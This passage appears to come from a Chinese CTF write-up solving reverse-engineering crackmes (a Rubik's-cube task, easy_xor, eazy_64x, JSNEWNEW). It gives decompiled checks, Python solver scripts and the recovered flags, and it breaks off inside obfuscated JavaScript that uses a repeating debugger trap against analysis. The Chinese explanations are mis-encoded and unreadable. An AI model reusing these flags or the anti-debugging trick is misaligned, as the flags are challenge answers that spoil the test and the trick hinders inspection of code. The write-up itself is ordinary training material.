R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2</span></span><br><span class="line"><span class="string">B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;</span></span><br><span class="line"><span class="string">R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 D</span></span><br><span class="line"><span class="string">F2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ssss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sss:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> i != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        ssss += i</span><br><span class="line"></span><br><span class="line">print(ssss)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥å¾—åˆ°å››ä¸ªé­”æ–¹çš„è§£æ³•ï¼Œå¯ä»¥ä½¿ç”¨ç¨‹åºéªŒè¯ï¼Œæœ€åå†å°†è§£æ³•æŒ‰ç…§é¢˜ç›®è¦æ±‚å¤„ç†å°±è¡Œ</p><p><code>xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125;</code></p><p>å‘</p><ul><li>v4æ•°ç»„çš„å®šä¹‰ç§å°‘äº†ä¸€ä¸ªå…ƒç´ <code>v4[133]</code>ï¼Œéœ€è¦åŠ¨æ€è°ƒè¯•å¾—åˆ°è¿™ä¸ªå…ƒç´ çš„å€¼</li><li>å› ä¸ºæ˜¯4ä¸ªé­”æ–¹ä¸€èµ·åç€è¾“å‡ºï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªé­”æ–¹çš„è§£æ³•åº”è¯¥å¯¹åº”ç¬¬å››è¡Œçš„è¾“å‡º</li><li>æœ€åä¸²èµ·æ¥çš„æ—¶å€™æ˜¯<code>ç¬¬ä¸€ä¸ªé­”æ–¹çš„è§£æ³•+ç¬¬äºŒä¸ªé­”æ–¹çš„è§£æ³•...</code>ï¼Œå³ç¬¬å››è¡Œ+ç¬¬ä¸‰è¡Œ+â€¦</li></ul><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><p>æ ¸å¿ƒä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7 = key[v9 % <span class="number">4</span>] ^ v8;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v7--;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      s[v3] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v11++;</span><br><span class="line">    s[v5] = <span class="number">0</span>;</span><br><span class="line">    ++v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt;= <span class="number">2559</span> )</span><br><span class="line">    s[v11++] = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2559</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( r[i] != s[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Lose lose lose!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">2560</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Win win win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ•°ç»„ræ˜¯åœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨åŠ¨æ€è°ƒè¯•</p><p>å¤§æ¦‚çš„é€»è¾‘æ˜¯ï¼š</p><ul><li>æ¥æ”¶è¾“å…¥ç›´åˆ°å›è½¦ç¬¦</li><li>è®¡ç®—æ¯ä¸ªå­—ç¬¦å¼‚æˆ–çš„ç»“æœ</li><li>å¼‚æˆ–çš„ç»“æœæ˜¯å¤šå°‘ï¼Œå°±åœ¨æ•°ç»„ä¸­æ·»åŠ å¤šå°‘ä¸ª1ï¼Œç„¶åæ·»åŠ ä¸€ä¸ª0</li><li>å¯¹æ¯”ä¸¤ä¸ªæ•°ç»„çš„å·®å¼‚</li></ul><p>å› æ­¤è§£å¯†çš„é€»è¾‘å°±æ˜¯</p><ol><li>æ‹¿åˆ°ç›®æ ‡æ•°ç»„</li><li>éå†æ•°ç»„ä¸­1çš„ä¸ªæ•°ï¼Œç›´åˆ°é‡åˆ°æ•°å­—0</li><li>å°†ä»¥ä¸Š1çš„ä¸ªæ•°å¾ªç¯å¼‚æˆ–keyçš„å…ƒç´ </li><li>è½¬æ¢ä¸ºå­—ç¬¦è¾“å‡º</li><li>é‡å¤2åˆ°4ï¼Œç›´åˆ°é‡åˆ°-1</li></ol><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = [...]</span><br><span class="line">ch = []</span><br><span class="line">key_index = <span class="number">0</span></span><br><span class="line">key = <span class="string">&#x27;SCNU&#x27;</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(hex(c), end=&#x27;&#x27;)</span></span><br><span class="line">        ch.append(<span class="built_in">chr</span>(c^<span class="built_in">ord</span>(key[key_index%<span class="number">4</span>])))</span><br><span class="line">        key_index += <span class="number">1</span></span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(ch))</span><br></pre></td></tr></table></figure><p><code>flag&#123;Winn3r_n0t_L0s3r_#&#125;</code></p><h2 id="eazy-64x"><a href="#eazy-64x" class="headerlink" title="eazy_64x"></a>eazy_64x</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+2Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x64</span>uLL);</span><br><span class="line">  __isoc99_scanf(&amp;unk_222C, s);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v7 / <span class="number">3</span> &gt;= v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, &amp;s[v5], <span class="number">3u</span>LL);</span><br><span class="line">      v9 = encrypt(dest);</span><br><span class="line">      v8 = <span class="built_in">strlen</span>(v9);</span><br><span class="line">      get_trans(v9);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9[i] != glob[<span class="number">4</span> * v4 + i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Oh,no!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(v9);</span><br><span class="line">      ++v4;</span><br><span class="line">      v5 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">72</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> )</span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">  v6[v4] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; v4 - <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2] = v7[(<span class="keyword">unsigned</span> __int8)a1[v3] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v6[v2 + <span class="number">1</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * a1[v3]) &amp; <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">    v6[v2 + <span class="number">2</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * a1[v3 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v6[v2 + <span class="number">3</span>] = v7[a1[v3 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v3 += <span class="number">3</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œè§‰å¾—æ˜¯base64ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æ¢è¡¨base64ï¼Œä½†æ˜¯è§£ä¸å‡ºæ¥ï¼Œæ¥ç€çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">get_trans</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[i] ^= <span class="number">0x68</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç±»ä¼¼baseç¼–ç ä¹‹åè¿˜åŠ äº†å¼‚æˆ–</p><p>æ€è·¯ï¼š</p><ul><li>å¼‚æˆ–è¿˜åŸ</li><li>base64</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x32</span>, <span class="number">0x05</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x5B</span>, <span class="number">0x1B</span>, <span class="number">0x10</span>, <span class="number">0x30</span>, <span class="number">0x5A</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x5A</span>, <span class="number">0x32</span>, <span class="number">0x3C</span>, <span class="number">0x21</span>, <span class="number">0x59</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x58</span>, <span class="number">0x55</span>]</span><br><span class="line">ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ss += <span class="built_in">chr</span>(i^<span class="number">0x68</span>)</span><br><span class="line">    </span><br><span class="line">print(base64.b64decode(ss))</span><br></pre></td></tr></table></figure><p><code>flag&#123;1_l0ve_reve25e&#125;</code></p><h2 id="JSNEWNEW"><a href="#JSNEWNEW" class="headerlink" title="JSNEWNEW"></a>JSNEWNEW</h2><p>ä¸€ä¸ªhtmlå†…åµŒç»è¿‡æ··æ·†çš„jsä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="function"><span class="keyword">function</span> <span class="title">_Y0u</span>(<span class="params">_0x5093c8,_0x291ad5</span>)</span>&#123;<span class="keyword">return</span> _0x5093c8+_0x291ad5&#125;<span class="function"><span class="keyword">function</span> <span class="title">_C4n</span>(<span class="params">_0x4277b8</span>)</span>&#123;<span class="keyword">return</span> _0x4277b8&amp;<span class="number">0xff</span>&#125;<span class="function"><span class="keyword">function</span> <span class="title">_N3v3r</span>(<span class="params">_0x414184,_0x29df09</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x414184^_0x29df09)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G37</span>(<span class="params">_0x500f65,_0x1ddb85</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x500f65|_0x1ddb85)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_Th15</span>(<span class="params">_0x1621d6,_0x285fc7</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x1621d6&amp;_0x285fc7)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4</span>(<span class="params">_0x2abb65</span>)</span>&#123;<span class="keyword">return</span> _C4n(~_0x2abb65)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4</span>(<span class="params">_0x5b22bc</span>)</span>&#123;<span class="keyword">return</span> _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],<span class="number">0x1</span>)))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1,_0x516603</span>)</span>&#123;<span class="keyword">return</span> _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8,_0x11e8ab,_0x2c730f</span>)</span>&#123;<span class="keyword">return</span> a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>)</span>&#123;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">var</span> _0x8b9e29=<span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;passwordError&#x27;</span>);_0xcaf3caf3=[],_0xc4f3c4f3=[<span class="number">0x55</span>,<span class="number">0xbf</span>,<span class="number">0x63</span>,<span class="number">0xbc</span>,<span class="number">0x33</span>,<span class="number">0x95</span>,<span class="number">0x31</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x49</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xdf</span>,<span class="number">0x63</span>,<span class="number">0xe5</span>,<span class="number">0x57</span>,<span class="number">0xd7</span>,<span class="number">0x73</span>,<span class="number">0xa6</span>,<span class="number">0x6e</span>,<span class="number">0xd3</span>,<span class="number">0x63</span>,<span class="number">0xa1</span>,<span class="number">0x92</span>,<span class="number">0x5b</span>,<span class="number">0x72</span>,<span class="number">0xe6</span>,<span class="number">0x8f</span>,<span class="number">0x76</span>,<span class="number">0x4f</span>,<span class="number">0xd0</span>],Hur1k=<span class="string">&#x27;Hur1k&#x27;</span>;<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x27</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;é”™è¯¯çš„&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x6</span>)!=<span class="string">&#x27;XSCTF&#123;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;é”™è¯¯çš„&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="number">0x26</span>]!=<span class="string">&#x27;&#125;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;é”™è¯¯çš„&#x27;</span>,![];_0x114514=_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x6</span>,<span class="number">0x20</span>),_0x51eb06=[];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x114514[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;_0x51eb06[<span class="string">&#x27;push&#x27;</span>](_0x114514[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x28db6c))&#125;<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">&#x27;getTime&#x27;</span>](),<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">_0x14b0c9,_0x56fb11</span>)</span>&#123;_0x56fb11=_0x56fb11||<span class="number">0x1</span>,_0x14b0c9=_0x14b0c9||<span class="number">0x0</span>,<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=(<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]*<span class="number">0x2455</span>+<span class="number">0xc091</span>)%<span class="number">0x38f40</span>;<span class="keyword">var</span> _0xee8b23=<span class="built_in">Math</span>[<span 